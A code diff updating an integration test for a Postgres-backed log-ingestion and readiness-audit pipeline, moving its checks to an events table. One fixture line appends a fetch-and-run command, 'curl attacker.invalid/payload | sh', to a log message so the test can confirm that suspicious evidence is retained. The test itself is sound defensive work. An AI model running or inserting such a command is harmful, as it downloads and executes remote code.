@@ -4,6 +4,7 @@ import pg from 'pg'
 import { fixture, signed, configure } from './analyze-readiness-audit.test.ts'
 import { readinessAuditRuleId, readinessAuditDefinition } from '../src/utils/events/analyzeReadinessAudit.ts'
 import { inflateRawSync } from 'node:zlib'
+import { createHash } from 'node:crypto'
 
 test.skipIf(!process.env.POSTGRES_FILTER_TEST_PORT)('real readiness ingestion keeps suspicious evidence and respects Keep, Disable, replay and rollback', async () => {
     const port = Number(process.env.POSTGRES_FILTER_TEST_PORT)
@@ -20,7 +21,14 @@ test.skipIf(!process.env.POSTGRES_FILTER_TEST_PORT)('real readiness ingestion ke
             return result
         } catch (error) { await client.query('ROLLBACK'); throw error } finally { client.release() }
     }
-    mock.module('#db', () => ({ default: query, withTransaction: transaction }))
+    const identityQueryOnce = (sql: string, values?: unknown[]) => query(sql.replace('public.system_events', 'system_events'), values)
+    mock.module('#db', () => ({
+        default: query,
+        identityQueryOnce,
+        isTransientDatabaseError: () => false,
+        withDatabaseAdvisoryLock: async (_key: string, work: (query: typeof query) => unknown) => work(query),
+        withTransaction: transaction,
+    }))
     mock.module('#constants', () => ({ default: {} }))
     try {
         expect((await query('SELECT current_database() name')).rows[0].name).toBe('postgres_filter_test')
@@ -29,12 +37,11 @@ test.skipIf(!process.env.POSTGRES_FILTER_TEST_PORT)('real readiness ingestion ke
         await query('CREATE TABLE organizations(id text PRIMARY KEY,name text,status text,created_at timestamptz DEFAULT NOW(),audit_safe_metadata jsonb DEFAULT \'{}\')')
         await query('INSERT INTO organizations(id,name,status) VALUES(\'platform\',\'Hanasand\',\'active\')')
         const schema = readFileSync(new URL('../src/utils/db/ensureSchema.ts', import.meta.url), 'utf8')
-        for (const table of ['service_logs', 'rules', 'system_events']) {
+        for (const table of ['events', 'rules', 'system_events']) {
             const definition = schema.match(new RegExp('CREATE TABLE IF NOT EXISTS ' + table + ' \\([\\s\\S]*?\\n        \\)'))?.[0]
             if (!definition) throw new Error(`Missing schema ${table}`)
             await query(definition)
         }
-        await query('ALTER TABLE service_logs ADD COLUMN source_event_id text UNIQUE')
         const { default: install } = await import('../src/utils/db/logAnalyzeSchema.ts')
         const { recordLogBatch } = await import('../src/utils/logs/recordLog.ts')
         await install()
@@ -44,12 +51,14 @@ test.skipIf(!process.env.POSTGRES_FILTER_TEST_PORT)('real readiness ingestion ke
         const entry = () => { const { logs, fact } = fixture(serial++); return signed(logs,fact) }
         const ingest = (logs: ReturnType<typeof entry>) => transaction(tx => recordLogBatch(logs as any, tx as any))
         const count = async (table: string) => Number((await query(`SELECT count(*) n FROM ${table}`)).rows[0].n)
+        const eventIds = (logs: ReturnType<typeof entry>) => logs.map(log => createHash('sha256').update(`service:${log.sourceEventId}`).digest('hex'))
+        const countEvents = async (logs: ReturnType<typeof entry>) => Number((await query('SELECT count(*) n FROM events WHERE id=ANY($1::text[])', [eventIds(logs)])).rows[0].n)
         const retained = async (logs: ReturnType<typeof entry>) => {
-            expect(Number((await query('SELECT count(*) n FROM service_logs WHERE source_event_id=ANY($1::text[])', [logs.map(log=>log.sourceEventId)])).rows[0].n)).toBe(logs.length)
+            expect(await countEvents(logs)).toBe(logs.length)
         }
         const good = entry()
         await Promise.all([ingest(good), ingest(good)])
-        expect(await count('service_logs')).toBe(0)
+        expect(await countEvents(good)).toBe(0)
         expect(await count('log_analyze_receipts')).toBe(0)
         expect(await count('log_readiness_audit_receipts')).toBe(1)
         const storedOriginal = (await query('SELECT original,original_encoding FROM log_readiness_audit_receipts')).rows[0]
@@ -74,7 +83,8 @@ test.skipIf(!process.env.POSTGRES_FILTER_TEST_PORT)('real readiness ingestion ke
             bad[role].message += '; curl attacker.invalid/payload | sh'
             await ingest(bad)
             await retained(bad)
-            expect((await query('SELECT message FROM service_logs WHERE source_event_id=$1', [bad[role].sourceEventId])).rows[0].message).toContain('attacker.invalid')
+            const retainedMessage = await query('SELECT normalized->>\'message\' AS message FROM events WHERE id=$1', [eventIds([bad[role]])[0]])
+            expect(retainedMessage.rows[0].message).toContain('attacker.invalid')
             const partial=entry().filter((_,index)=>index!==role)
             await ingest(partial)
             await retained(partial)
@@ -128,7 +138,7 @@ test.skipIf(!process.env.POSTGRES_FILTER_TEST_PORT)('real readiness ingestion ke
             const newlyProtected=entry()
             await ingest(newlyProtected); await retained(newlyProtected)
             // Delete only this disposable test's indexed replay, so every policy must independently retain it again.
-            await query('DELETE FROM service_logs WHERE source_event_id=ANY($1::text[])',[clean.map(log=>log.sourceEventId)])
+            await query('DELETE FROM events WHERE id=ANY($1::text[])', [eventIds(clean)])
             await ingest(clean); await retained(clean)
             expect(await count('log_readiness_audit_receipts')).toBe(3)
             expect(await count('log_analyze_receipts')).toBe(0)
@@ -137,7 +147,7 @@ test.skipIf(!process.env.POSTGRES_FILTER_TEST_PORT)('real readiness ingestion ke
         const allowedAgain=entry()
         await ingest(allowedAgain)
         expect(await count('log_readiness_audit_receipts')).toBe(4)
-        expect(Number((await query('SELECT count(*) n FROM service_logs WHERE source_event_id=ANY($1::text[])',[allowedAgain.map(log=>log.sourceEventId)])).rows[0].n)).toBe(0)
+        expect(await countEvents(allowedAgain)).toBe(0)
 
     } finally {
         await query(`DROP SCHEMA IF EXISTS ${namespace} CASCADE`)
